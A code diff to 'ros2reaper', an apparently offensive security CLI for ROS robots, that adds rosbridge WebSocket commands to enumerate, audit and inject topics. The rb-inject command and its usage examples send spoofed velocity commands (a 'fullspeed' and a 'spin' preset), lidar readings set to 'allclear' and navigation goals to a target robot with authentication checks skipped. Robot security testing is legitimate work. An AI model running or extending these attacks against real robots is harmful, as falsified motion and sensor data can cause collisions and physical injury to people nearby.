@@ -43,6 +43,11 @@ Commands (ROS 1):
     ros1-exploit   - Kill nodes / manipulate parameter server
     ros1-audit     - ROS1 security configuration audit
 
+Commands (rosbridge / WebSocket):
+    rb-enum        - Enumerate topics/nodes/services/params via rosbridge
+    rb-inject      - Inject topics via rosbridge WebSocket (no ROS install needed)
+    rb-audit       - Audit rosbridge security posture
+
 Author: Gh057x
 License: MIT — Use responsibly.
 """
@@ -736,6 +741,125 @@ def cmd_ros1_audit(args):
 
 
 # =============================================================================
+# ROSBridge Commands
+# =============================================================================
+
+def cmd_rb_enum(args):
+    """Enumerate ROS compute graph via rosbridge WebSocket"""
+    from modules.rosbridge import RosbridgeEnumerator
+
+    if not args.target:
+        print("[-] --target required for rb-enum (rosbridge host)")
+        return
+
+    port = args.rb_port
+    print(f"\n[*] rosbridge enumeration at {args.target}:{port}")
+
+    enumerator = RosbridgeEnumerator(port=port, timeout=args.timeout,
+                                     verbose=args.verbose)
+    result = enumerator.enumerate(args.target)
+
+    if result.errors and not result.topics and not result.nodes:
+        print(f"[!] Enumeration failed: {result.errors[0]}")
+        return
+
+    print(f"\n\033[92m[+] rosbridge at {args.target}:{port} — enumeration complete\033[0m\n")
+
+    if result.topics:
+        print(f"  Topics ({len(result.topics)}):")
+        for t in sorted(result.topics, key=lambda x: x.name):
+            type_str = f"  [{t.msg_type}]" if t.msg_type else ""
+            print(f"    {t.name}{type_str}")
+
+    if result.nodes:
+        print(f"\n  Nodes ({len(result.nodes)}):")
+        for n in sorted(result.nodes):
+            print(f"    {n}")
+
+    if result.services:
+        print(f"\n  Services ({len(result.services)}):")
+        for s in sorted(result.services):
+            print(f"    {s}")
+
+    if result.params:
+        print(f"\n  Parameters ({len(result.params)}):")
+        for p in sorted(result.params)[:20]:
+            print(f"    {p}")
+        if len(result.params) > 20:
+            print(f"    ... and {len(result.params) - 20} more")
+
+    if args.output:
+        enumerator.export_results(args.output)
+
+
+def cmd_rb_inject(args):
+    """Inject topics via rosbridge WebSocket"""
+    from modules.rosbridge import RosbridgeInjector
+
+    if not args.target:
+        print("[-] --target required for rb-inject (rosbridge host)")
+        return
+
+    mode = args.attack_mode or "cmd_vel"
+    port = args.rb_port
+
+    print(f"\n[*] rosbridge injection")
+    print(f"[*] Target:   {args.target}:{port}")
+    print(f"[*] Mode:     {mode}")
+    print(f"[*] Duration: {args.duration}s\n")
+
+    injector = RosbridgeInjector(host=args.target, port=port,
+                                  timeout=args.timeout, verbose=args.verbose)
+
+    if mode == "cmd_vel":
+        topic = args.topic or "/cmd_vel"
+        injector.inject_cmd_vel(topic=topic, preset=args.preset,
+                                 duration=args.duration)
+    elif mode == "lidar":
+        topic = args.topic or "/scan"
+        injector.inject_lidar(topic=topic, mode=args.lidar_mode,
+                               duration=args.duration)
+    elif mode == "nav":
+        topic = args.topic or "/move_base_simple/goal"
+        injector.inject_nav_goal(topic=topic, x=args.x, y=args.y,
+                                  duration=args.duration)
+    else:
+        print(f"[!] Unknown rb-inject mode: {mode}  (use cmd_vel, lidar, or nav)")
+        return
+
+    if args.output:
+        injector.export_results(args.output)
+
+
+def cmd_rb_audit(args):
+    """Audit rosbridge WebSocket security posture"""
+    from modules.rosbridge import RosbridgeAuditor, RosbridgeEnumerator
+    from modules.sros2_audit import print_audit_report
+
+    if not args.target:
+        print("[-] --target required for rb-audit (rosbridge host)")
+        return
+
+    port = args.rb_port
+    print(f"[*] Enumerating rosbridge at {args.target}:{port}...")
+
+    enumerator = RosbridgeEnumerator(port=port, timeout=args.timeout,
+                                     verbose=args.verbose)
+    enum_result = enumerator.enumerate(args.target)
+
+    auditor = RosbridgeAuditor(port=port, timeout=args.timeout,
+                                verbose=args.verbose)
+    report = auditor.audit(args.target, enum_result=enum_result)
+
+    print_audit_report(report)
+
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump(report.to_dict(), f, indent=2, default=str)
+        print(f"[*] rosbridge audit report saved to {args.output}")
+
+
+# =============================================================================
 # Output Formatters
 # =============================================================================
 
@@ -970,6 +1094,14 @@ Examples:
   python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --node /turtlesim --skip-auth
   python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --kill-all --skip-auth
   python3 ros2reaper.py ros1-exploit  --target 192.168.1.10 --param-key /max_speed --param-value 0.1 --skip-auth
+
+  # rosbridge / WebSocket (no ROS install needed)
+  python3 ros2reaper.py rb-enum    --target 192.168.1.10 --skip-auth
+  python3 ros2reaper.py rb-audit   --target 192.168.1.10 --skip-auth -o rb_audit.json
+  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --preset spin --duration 10 --skip-auth
+  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --attack-mode lidar --lidar-mode allclear --skip-auth
+  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --attack-mode nav --x 10 --y 5 --skip-auth
+  python3 ros2reaper.py rb-inject  --target 192.168.1.10 --rb-port 9090 --topic /cmd_vel --preset fullspeed --skip-auth
         """,
     )
 
@@ -980,7 +1112,9 @@ Examples:
                                  "inject", "impersonate", "amplify",
                                  # ROS 1
                                  "ros1-discover", "ros1-inject",
-                                 "ros1-exploit", "ros1-audit"],
+                                 "ros1-exploit", "ros1-audit",
+                                 # rosbridge / WebSocket
+                                 "rb-enum", "rb-inject", "rb-audit"],
                         help="Command to execute")
 
     # Target options
@@ -1019,6 +1153,10 @@ Examples:
                         help="LIDAR spoofing mode")
     parser.add_argument("--count", type=int, default=50,
                         help="Count for exhaustion/sybil attacks")
+
+    # rosbridge options
+    parser.add_argument("--rb-port", type=int, default=9090,
+                        help="rosbridge WebSocket port (default: 9090)")
 
     # ROS1 options
     parser.add_argument("--ros1-port", type=int, default=11311,
@@ -1072,6 +1210,10 @@ Examples:
         "ros1-inject":   cmd_ros1_inject,
         "ros1-exploit":  cmd_ros1_exploit,
         "ros1-audit":    cmd_ros1_audit,
+        # rosbridge / WebSocket
+        "rb-enum":       cmd_rb_enum,
+        "rb-inject":     cmd_rb_inject,
+        "rb-audit":      cmd_rb_audit,
     }
 
     try:
